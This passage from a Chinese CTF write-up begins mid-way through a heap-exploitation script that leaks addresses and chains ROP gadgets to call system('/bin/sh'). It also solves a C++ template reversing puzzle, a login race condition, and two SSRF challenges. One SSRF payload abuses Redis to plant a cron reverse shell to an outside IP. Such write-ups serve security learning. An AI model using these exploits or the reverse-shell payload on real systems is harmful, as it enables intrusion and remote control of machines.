create(0x21, 0x20*'a'+'\x00')
create(0x9, 0x8*'a'+'\x00')
create(0x21, 0x20*'a'+'\x00')
# sep
create(0x421, 0x420*'a' + '\x00')
delete(0)
delete(1)
delete(2)
delete(3)
delete(5)
create(0x421, 0x420*'a' + '\x00')
#create(0x200, 0x110*'a' + p16(0x09d0) + '\x00')
payload = 0x90*'a'
payload += '~%175$p~'
payload = payload.ljust(0xa0)
payload += 8 * 'a'
#payload += p16(0x9d0)
payload += p8(0x2d)
payload += '\x00'
create(0xb0, payload)
#raw_input()
delete(2)
ru('aaaaaaaa')
addr = u64(rn(6).ljust(8, '\x00'))
pie = addr - 0xd2d
info("PIE = " + hex(pie))
delete(1)
payload = 'a'.ljust(0xa0)
payload += 8 *'a'
payload += p64(0x11dc + pie)
payload += '\x00'
create(0xb1, payload)
if LOCAL: gdb.attach(io)
pop3 = 0x00000000000011de + pie
pop4 = 0x00000000000011dc + pie
poprdi = 0x00000000000011e3 + pie
poprsi = 0x00000000000011e1 + pie
puts = 0x990 + pie
main = 0xbee + pie
rop = p64(poprdi)
rop += p64(pie + 0x202018)
rop += p64(puts)
rop += p64(main)
rophelper = "yes".ljust(8)
rophelper += rop
delete(2, rophelper)
addr = u64(rn(6).ljust(8, '\x00')) - 0x83940
info("libc = " + hex(addr))
system = 0x45390 + addr
binsh = 0x18c177 + addr
rop = p64(poprdi)
rop += p64(binsh)
rop += p64(system)
rop += p64(main)
rophelper = "yes".ljust(8)
rophelper += rop
delete(2, rophelper)
io.interactive()
return
if __name__ == '__main__':
while 1:
try:
makeio()
pwn()
except Exception, e:
print 'Retry in 10 seconds'
io.close()
if not LOCAL:
time.sleep(5)
continue
#break
break
Level3
1.Misc-48 小时如何快速精通 c++
分析 template 功能后解密得到 flag
#include 
constexpr char FLAG[] = "hctf{S0_Ea5y_Cpp_T3mp1at3}"; //input the flag !!!
// len = 26
template  struct ___Fun1___ { enum { ___ = (_ == __) }; }; // equal
template  struct ___fun2___ { enum { ___ = (_ ^ __) }; }; // xor
template  struct ___fun3___ {enum { ___ = FLAG[__] };}; // flag[i]
template  struct ___fun4___ {enum{___ = _ % __}; }; // mod
template struct ___fun5___ { const static int ___ = __  struct ___fun6___ { const static int ___ = __ >> _; }; // shr
template struct ___fun7___ { const static int ___ = _ & __; }; // and
template struct ___fun8___ { const static int ___ = _ | __; }; // or
template  struct ___fun9___ { enum { ___ = __ + ___fun9___ ::___ }; }; // add from n to 0 =
(n+1)n/2
template <> struct ___fun9___ { enum { ___ = 0 }; }; // 0
template  struct ___fun10___ { enum { ___ = ___Fun1___ ::___ }; }; //
(sizeof(FLAG) - 1) == n
template  struct ___fun11___ {enum {___ = ___Fun1___::___,
0x20>::___, 93>::___};}; //flag[i] ^ 0x20 == 93, __ no use
template  struct ___fun11___ {enum { ___ = 0 };}; // 0
constexpr int ___Arr1___[] = { 88, 83, 68, 86, 75 };
template  struct ___fun12___ { enum { ___ = ___Arr1___[_] }; }; // Arr1[i]
template struct ___fun13___ { enum { ____ = ___fun13___ ::___, ___fun2___::___, 0x30>::___>::___ >::____};}; // from n to
n-1 until: i == -1 && Arr1[i] == flag[i] ^ 0x30 then 1;
template struct ___fun13___ {enum { ____ = ___fun13___ ::___, ___fun2___::___, 0x30>::___>::___ >::____}; }; // check
from n to 0: Arr1[i] == flag[i] ^ 0x30
template<> struct ___fun13___  { enum { ____ = 1 };}; // 1
template struct ___fun13___ {enum { ____ = 0 }; }; // check from n to 0: Arr1[i] == flag[i] ^ 0x30
template struct ___fun14___ { enum { ___ = 0 }; }; // 0 no condition
template struct ___fun14___ { enum { ___ = (___fun3___ ::___ >::___ +
_) }; }; // 0: flag[i+5]+i
template struct ___fun14___ { enum { ___ = (___fun3___ ::___ >::___ -
_) }; }; // 1: flag[i+5]-i
template struct ___fun15___ {enum {___ = ___fun2___::___, 106>::___}; }; // (n+1)n/2 ^
106
template struct ___fun16___ {enum {___ = ___fun2___::___>::___,
___fun15___::___>::___};}; // (FLAG[n+5]+-n) ^ (n+1)n/2 ^ 106
template struct ___fun17___ { const static int ___ = ___fun8___::___, ___fun5___::___>::___>::___; }; // n>>4 | (n&0xF) struct ___fun18___ { const static int ___ = ___fun2___ ::___>::___, ___fun18___ ::___ >::___; }; // from n to n-1 until 0：
shift( (FLAG[n+5]+-n) ^ (n+1)n/2 ^ 106 ) ^f(n-1)
template <> struct ___fun18___ { const static int ___ = ___fun17___::___>::___; }; //
shift(FLAG[2*(n%2)+5]) ^ (n+1)n/2 ^ 106
constexpr int ___Arr2___[] = { 0x93, 0xd7, 0x57, 0xb5, 0xe5, 0xb0, 0xb0, 0x52, 0x2, 0x0, 0x72, 0xb5, 0xf1, 0x80,
0x7, 0x30, 0xa, 0x30, 0x44, 0xb };
template  struct ___fun19___ { enum { ___ = ___Arr2___[_] }; }; //Arr2[i]
template  struct ___fun20___ { enum {___ = ___fun20___ ::___, ___fun18___::___>::___ >::___}; }; // from n to n+1 till 20: if Arr2[i] == f18(n)
template <> struct ___fun20___ {enum {___ = 1}; }; // check from n to 20: Arr2[i] == f18(n)
template  struct ___fun20___ { enum { ___ = 0 }; };
template  struct ___fun21___ {enum { ___ = ___fun11___ ::____ >::___ };};
// judge len==26 && flag[0:5]=="hctf{" && flag[-1]=="}"
template <> struct ___fun21___  { enum { ___ = 0 }; };
struct __Start {
enum {
ret = ___fun20___::___>::___>::___
};
};
int main()
{
if (__Start::ret) {
printf("Yes,You got it\n");
} else {
printf("Sorry,try again\n");
}
printf("%c", 106 ^ 0x39, ___Arr2___[0] == ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((1 + 1) * 1 / 2)) + 1, ___Arr2___[1]
== ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((2 + 1) * 2 / 2)) - 2, ___Arr2___[2]
== ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((3 + 1) * 3 / 2)) + 3, ___Arr2___[3]
== ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((4 + 1) * 4 / 2)) - 4, ___Arr2___[4]
== ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((5 + 1) * 5 / 2)) + 5, ___Arr2___[5]
== ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((6 + 1) * 6 / 2)) - 6, ___Arr2___[6]
== ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((7 + 1) * 7 / 2)) + 7, ___Arr2___[7]
== ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((8 + 1) * 8 / 2)) - 8, ___Arr2___[8]
== ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((9 + 1) * 9 / 2)) + 9, ___Arr2___[9]
== ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((10 + 1) * 10 / 2)) - 10,
___Arr2___[10] == ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((11 + 1) * 11 / 2)) + 11,
___Arr2___[11] == ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((12 + 1) * 12 / 2)) - 12,
___Arr2___[12] == ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((13 + 1) * 13 / 2)) + 13,
___Arr2___[13] == ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((14 + 1) * 14 / 2)) - 14,
___Arr2___[14] == ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((15 + 1) * 15 / 2)) + 15,
___Arr2___[15] == ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((16 + 1) * 16 / 2)) - 16,
___Arr2___[16] == ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((17 + 1) * 17 / 2)) + 17,
___Arr2___[17] == ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((18 + 1) * 18 / 2)) - 18,
___Arr2___[18] == ___fun18___::___);
printf("%c", (106 ^ ___fun17___ ::___ ^ ((19 + 1) * 19 / 2)) + 19,
___Arr2___[19] == ___fun18___::___);
return 0;
}
2.Web-香港记者还要快
这里在 README.md 发现一些提示
可以分析逻辑为
注册： 先 insett 一个用户入库，只是权限为 1 然后是一个 update 操作降低权限
登陆: select 查询角色 并写入 session 中，跳转为 index.php,如果权限为 1 就打出 flag
所以逻辑就是 只要我们在 update 操作前登陆成功，我们就可以获取 flag 了
所以 先抓取登陆的数据包（用户未注册），然后我们就可以放入 burp 爆破中，开高点的线
程登陆，然后我们注册那个登陆的用户，用户已注册就会被登陆的 select 查询到，还没有被
降低权限，也就获取 flag 了
Ssrf-1
在 vps 建立一个中转的页面
Post 提交
Link=link=http://www.cheery.win/1.php?url=http://127.0.0.1
得到一个 base64，解开就是第一个的 flag
Ssrf-2
接着上道题，扫描发现 192.168.0.10 6379 开了一个 redis
Payload：
link=http://www.cheery.win/1.php?url=http://192.168.0.10%25250d%25250a%252a3%252
50d%25250a%2525243%25250d%25250aset%25250d%25250a%2525241%25250d%25250a1%25250d%
25250a%25252462%25250d%25250a%25250a%252a%25252F1%252520%252a%252520%252a%252520
%252a%252520%252a%252520%25252Fbin%25252Fbash%252520-i%252520%25253E%252526%2525
20%25252Fdev%25252Ftcp%25252F120.27.104.15%25252F8088%2525200%25253E%2525261%252
50a%25250d%25250aconfig%252520set%252520dir%252520%25252Fvar%25252Fspool%25252Fcron%
25252F%25250d%25250aconfig%252520set%252520dbfilename%252520root%25250d%25250asave%2
5250d%25250a%253A6379%252f
vps 上监听反弹就可以了
3. Reverse-点我点我，我是最正常的逆向题
hctf{The_Basic_0f_RE_0A0d}
SMC
和 defcon qual 的 step 一个套路